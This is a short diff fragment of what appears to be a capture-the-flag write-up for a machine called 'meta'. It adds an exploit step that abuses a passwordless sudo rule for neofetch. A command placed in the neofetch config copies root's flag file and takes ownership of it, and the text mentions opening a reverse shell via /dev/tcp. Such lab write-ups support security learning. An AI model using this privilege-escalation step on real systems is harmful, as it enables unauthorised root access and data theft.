@@ -328,6 +328,7 @@ User thomas may run the following commands on meta:
     (root) NOPASSWD: /usr/bin/neofetch \"\"
 ````
 
+## Exploit
 Add to /home/thomas/.config/neofetch; you can also create an reverse shell with /dev/tcp
 ````
 /bin/bash -c "cp /root/root.txt .; chown thomas:thomas root.txt" 
